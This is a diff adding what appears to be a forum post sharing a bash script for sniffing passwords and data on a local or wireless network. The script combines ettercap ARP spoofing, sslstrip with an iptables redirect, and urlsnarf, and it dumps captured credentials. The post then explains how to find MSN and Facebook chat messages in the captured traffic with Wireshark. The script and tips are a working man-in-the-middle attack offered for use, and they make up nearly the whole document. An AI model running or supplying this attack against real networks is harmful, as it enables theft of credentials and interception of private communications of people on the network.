@@ -1,0 +1,68 @@
+Script for sniffing passwords and data on lan/wlan using ettercap, sslstrip, urlsnarf
+
+    I got very tired of writing commands endlessly while pentesting my network. So i started writing script for anything i do. This script is the one i use mostly.
+    Im still very new at Backtrack/Linux, but this script really works for me, and im sure other beginners out there can put it to good use as well.
+
+    First of all, make sure your etter.conf is default. Your etter.conf is located at /etc/etter.conf - this section must remain commented out:
+    Code:
+
+    # if you use iptables:
+       #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+       #redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+
+    This is because i use ettercap to do the arpspoofing, but i dont want it to do the fake certificate thing (we have sslstrip to do the job).
+
+    Save this code to a new text file and save as anything.sh (make sure to chmod to execute, right click->properties->permissions->check "is executable")
+
+    Code:
+
+****************************************************************************************************
+    #!/bin/bash
+    echo -n "Do you want to execute Wireshark when done? If yes, LEAVE BLANK "
+    read -e NOYES
+    echo -n "Do you want to extract pictures from the pcap via tcpxtract? If yes, LEAVE BLANK "
+    read -e XTRACT
+    echo -n "What interface to use? ie wlan0: "
+    read -e IFACE
+    echo -n "Name of "Session"? (name of the folder that will be created with all the log files): "
+    read -e SESSION
+    echo -n "Gateway IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
+    read -e ROUTER
+    echo -n "Target IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
+    read -e VICTIM
+    mkdir /root/$SESSION/
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+    sslstrip -p -k -w /root/$SESSION/$SESSION.log &
+    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+    urlsnarf -i $IFACE | grep http > /root/$SESSION/$SESSION.txt &
+    ettercap -T -i $IFACE -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp /$ROUTER/ /$VICTIM/
+    "$XTRACT"tcpxtract -f /root/$SESSION/$SESSION.pcap
+    "$NOYES"wireshark &
+    killall sslstrip
+    killall python
+    killall urlsnarf
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+    etterlog -p -i /root/$SESSION/$SESSION.eci
+****************************************************************************************************
+
+    Its pretty forward...
+
+    This script will execute sslstrip+log file, urlsnarf (dumping all the urls to a txt file), ettercap with arpspoofing+log files (with the passwords)+pcap file (for further analyze). all the files are put in the same folder, with identical filenames (of course with different extensions).
+    Furthermore when quitting the script (and ettercap) properly with the key "q", the script will clean up after itself (shutting down sslstrip,urlsnarf and flushing iptables). At last it automatically reads out passwords from the ettercap logfile (.eci) and runs wireshark for further analyze.
+
+    TIP: For me the easiest way to dump pictures from a pcap file (which the script generates), is by using NetworkMiner for windows. It runs smooth via wine, if you tweak it a bit like this tutorial shows: hxxp://geek00l.blogspot.com/2008/12/drunken-monkey-running-network-miner.html
+
+    HOW TO FIND MSN/FACEBOOK CHAT IN WIRESHARK:
+    Finding msn chat is easy. There are many EXPRESSIONS in wireshark, one has the name "MSNMS". If you apply that, it'll show you the messages.
+
+    Finding facebook chat is a bit more complicated. There are no EXPRESSION or filter to use. BUT i found out:
+    CTRL+F brings you the search packet command. search for: /ajax/chat/send.php
+    ATTENTION: in the search box, check the box that searches by "string" and in search in: Packet List.
+
+    That will give you the packets with the sent messages. When you select the packet, scroll down to the button and expand the "Line-based text data:"
